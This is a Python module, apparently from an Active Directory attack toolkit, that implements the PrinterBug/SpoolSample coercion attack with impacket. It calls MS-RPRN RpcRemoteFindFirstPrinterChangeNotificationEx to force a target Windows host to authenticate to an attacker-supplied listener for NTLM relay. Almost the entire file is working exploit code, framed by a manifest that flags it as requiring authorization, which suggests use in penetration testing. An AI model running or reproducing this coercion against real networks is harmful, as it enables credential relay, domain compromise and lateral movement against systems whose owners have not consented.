"""PrinterBug / SpoolSample  -  coerce via MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.coercion.printerbug.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion", "rpc_call"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    listener = getattr(args, "listener", None)

    if not listener:
        print("[!] --listener required", file=sys.stderr)
        return 1

    print(f"[*] PrinterBug: {target} → coerce to {listener}")

    try:
        from impacket.dcerpc.v5 import transport, rprn
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        string_binding = f"ncacn_np:{target}[\\pipe\\spoolss]"
        rpc_transport = transport.DCERPCTransportFactory(string_binding)

        if cred.username:
            rpc_transport.set_credentials(
                cred.username, cred.password or "", cred.domain,
                cred.lm_hash, cred.nt_hash)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)

        request = rprn.RpcOpenPrinter()
        request["pPrinterName"] = f"\\\\{target}\x00"
        resp = dce.request(request)
        handle = resp["pHandle"]

        request2 = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
        request2["hPrinter"] = handle
        request2["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
        request2["pszLocalMachine"] = f"\\\\{listener}\\x00"
        request2["dwPrinterLocal"] = 0
        request2["pOptions"] = None

        try:
            dce.request(request2)
        except Exception:
            pass

        print(f"[+] PrinterBug triggered  -  check relay listener on {listener}")
        dce.disconnect()
        return 0

    except Exception as exc:
        print(f"[-] PrinterBug error: {exc}", file=sys.stderr)
        return 1
